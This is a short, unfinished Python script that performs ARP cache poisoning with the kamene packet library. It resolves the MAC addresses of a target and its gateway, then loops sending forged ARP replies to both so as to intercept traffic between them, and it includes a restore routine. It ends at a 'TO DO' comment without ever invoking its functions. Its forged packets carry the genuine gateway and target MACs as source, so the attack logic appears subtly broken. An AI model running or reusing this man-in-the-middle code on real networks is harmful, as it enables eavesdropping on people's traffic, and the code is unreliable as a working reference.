from kamene.all import *
import threading
import sys
import time

interface="en1"
targetIP=input()
target_gateway=input()
packet_count=1000
Poison=True

def restoreTarget(gatewayMac,gatewayIP,targetIP,targetMac):
    print("[*] Restoring target and Gateway")
    send(ARP(op=2,
             psrc=gatewayIP,
             pdst=targetIP,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gatewayMac),count=5,verbose=False)
    send(ARP(op=2,
             psrc=targetIP,
             pdst=gatewayIP,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=targetMac),count=5,verbose=False)


def get_mac(ip):
    responses,unanswered=srp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
        timeout=2,
        retry=10,
    )
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(targetIP,targetMac,gatewayIP,gatewayMac):
    global Poison
    print("[*] Poisoning Target")
    poisontrgt=ARP()
    poisontrgt.op=2
    poisontrgt.psrc=gatewayIP
    poisontrgt.pdst=targetIP
    poisontrgt.hwdst=targetMac
    poisontrgt.hwsrc=gatewayMac

    poisongateway=ARP()
    poisongateway.op=2
    poisongateway.pdst=gatewayIP
    poisongateway.psrc=targetIP
    poisongateway.hwdst=gatewayMac
    poisongateway.hwsrc=targetMac

    print("[*] Beginning the poisoning ")
    while Poison:
        send(poisontrgt,verbose=False)
        send(poisongateway,verbose=False)
        time.sleep(2)
    print("[*] Poisoning Stopped")

    return 

conf.iface=interface
conf.verb=0
#-----TO DO-------


    